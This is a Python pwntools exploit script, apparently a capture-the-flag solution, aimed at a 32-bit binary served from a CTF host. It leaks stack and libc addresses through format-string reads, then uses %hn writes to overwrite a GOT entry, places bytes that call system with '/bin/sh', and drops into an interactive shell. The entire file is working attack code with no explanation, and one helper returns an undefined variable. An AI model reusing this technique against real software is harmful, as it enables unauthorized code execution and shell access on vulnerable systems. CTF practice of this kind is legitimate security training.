import sys
from pwn import *
import re

STACKBASE = 0

def info(s):
    log.info(s)

def readAddress(num):
    r.sendline('1')
    r.sendline('1')
    r.sendline('128')
    r.sendline('%%%d$p' % num)
    r.send('\n')

    r.send('2\n')
    d = r.recv(0x4000) + r.recv(0x4000)
    data = re.findall('0x\w+', d)

    try:
        data = int(data[0], 16)
    except Exception as e:
        data = -1
    r.send('3\n1\n')
    return data


def writeToParam(num, address):
    DESTADDLO = STACKBASE + (num * 4)
    DESTADDHI = DESTADDLO + 2

    WRITELO = DESTADDLO & 0xffff
    WRITEHI = DESTADDHI & 0xffff
    writeLO(15, WRITELO)
    writeLO(16, WRITEHI)

    ADDRLO = address & 0xffff
    ADDRHI = (address & 0xffff0000) >> 16
    writeLO(51, ADDRLO)
    writeLO(53, ADDRHI)

def writeLO(num, value):
    r.send('1\n1\n128\n')
    r.sendline('%%%du%%%d$hn' % (value, num))
    d = r.recv()
    r.send('\n')
    d = r.recv()
    r.send('2\n')
    r.recv()
    r.send('3\n1\n')
    return data

def writeValueToAddress(address, value):
    writeToParam(11, address)
    writeToParam(12, address+2)

    VALLO = value & 0xffff
    VALHI = (value & 0xffff0000) >> 16
    writeLO(11, VALLO)
    writeLO(12, VALHI)

def exploit(r):
    global STACKBASE
    info("LEAK STACK ADDRESS")
    STACKLEAK = readAddress(15)
    STACKBASE = STACKLEAK - (51 * 4)
    info("STACKBASE\t: %s" % hex(STACKBASE))
    libc = readAddress(13)

    LIBCBASE = libc - 121765
    RET = 0x0804B450
    BINSH = LIBCBASE + 0x190EF0
    SYSTEM = LIBCBASE + 0x443D0
    info("RET\t\t\t: %s" % hex(RET))
    info("LIBCBASE\t: %s" % hex(LIBCBASE))
    info("SYSTEM\t\t: %s" % hex(SYSTEM))
    info("BINSH\t\t: %s" % hex(BINSH))
    writeValueToAddress(RET, 0x0804b000)            # overwrite exit in got
    writeValueToAddress(0x0804b000, 0x68)           # push 0x00000000
    writeValueToAddress(0x0804b001, 0x00000000)
    writeValueToAddress(0x0804b005, 0x68)           # push 0x00000000
    writeValueToAddress(0x0804b006, 0x00000000)
    writeValueToAddress(0x0804b00A, 0x68)           # push &/bin/sh
    writeValueToAddress(0x0804b00B, BINSH)
    writeValueToAddress(0x0804b00F, 0x68)           # push dummy return
    writeValueToAddress(0x0804b010, 0x0804B450)
    writeValueToAddress(0x0804b014, 0x68)           # push &system
    writeValueToAddress(0x0804b015, SYSTEM)
    writeValueToAddress(0x0804b019, 0xc3)           # return
    r.interactive()

if __name__ == "__main__":
    if len(sys.argv) > 1:
        r = remote('tasks.open.kksctf.ru', 10000)
    else:
        env = {"LD_PRELOAD": "glibc2.27x86/lib/libc.so.6 glibc2.27x86/lib/libpthread.so.0 glibc2.27x86/lib/ld-linux.so.2"}
        r = process('./df', env=env)
    exploit(r)
